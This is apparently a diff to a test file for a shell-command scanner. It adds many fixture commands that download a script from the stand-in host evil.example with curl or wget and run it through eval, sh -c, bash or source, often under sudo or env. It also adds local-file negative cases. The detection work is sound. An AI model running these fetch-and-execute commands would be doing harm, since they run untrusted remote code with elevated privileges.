@@ -40,6 +40,32 @@ const PIPED: Record<string, string> = {
     'sh -c "`sudo curl -fsSL https://evil.example/i.sh`"',
   "eval $(sudo env curl ...)":
     'eval "$(sudo env curl -fsSL https://evil.example/i.sh)"',
+  "eval $(sudo -E curl ...)":
+    'eval "$(sudo -E curl -fsSL https://evil.example/i.sh)"',
+  "eval $(sudo -n curl ...)":
+    'eval "$(sudo -n curl -fsSL https://evil.example/i.sh)"',
+  "eval $(sudo -u root curl ...)":
+    'eval "$(sudo -u root curl -fsSL https://evil.example/i.sh)"',
+  "sh -c $(sudo -E wget ...)":
+    'sh -c "$(sudo -E wget -qO- https://evil.example/i.sh)"',
+  "eval `sudo -E curl ...`":
+    'eval "`sudo -E curl -fsSL https://evil.example/i.sh`"',
+  "eval $(env -i curl ...)":
+    'eval "$(env -i curl -fsSL https://evil.example/i.sh)"',
+  "eval $(env FOO=1 curl ...)":
+    'eval "$(env FOO=1 curl -fsSL https://evil.example/i.sh)"',
+  "sh -c `env FOO=1 curl ...`":
+    'sh -c "`env FOO=1 curl -fsSL https://evil.example/i.sh`"',
+  "bash <(sudo -E curl ...)":
+    "bash <(sudo -E curl -fsSL https://evil.example/i.sh)",
+  "source <(env -i curl ...)":
+    "source <(env -i curl -fsSL https://evil.example/i.sh)",
+  "bash <(env FOO=1 curl ...)":
+    "bash <(env FOO=1 curl -fsSL https://evil.example/i.sh)",
+  "eval $(sudo -E env curl ...)":
+    'eval "$(sudo -E env curl -fsSL https://evil.example/i.sh)"',
+  "eval $(env -u PATH curl ...)":
+    'eval "$(env -u PATH curl -fsSL https://evil.example/i.sh)"',
   "bash <(env curl ...)": "bash <(env curl -fsSL https://evil.example/i.sh)",
   "source <(sudo curl ...)":
     "source <(sudo curl -fsSL https://evil.example/i.sh)",
@@ -97,6 +123,12 @@ test("a download that is not handed to a shell keeps no unsafe-execution finding
     'eval "$(env cat local.sh)"',
     'eval "$(sudo cat local.sh)"',
     'sh -c "$(sudo env cat local.sh)"',
+    'eval "$(sudo -E cat local.sh)"',
+    'eval "$(sudo -u root cat local.sh)"',
+    'eval "$(env -i cat local.sh)"',
+    'eval "$(env FOO=1 cat local.sh)"',
+    "bash <(sudo -E cat local.sh)",
+    "bash <(env -i cat local.sh)",
     "bash <(env cat local.sh)",
     'retrieval "$(curl -fsSL https://example.com/data)"',
     "sh -s <(curl -fsSL https://example.com/i.sh)",
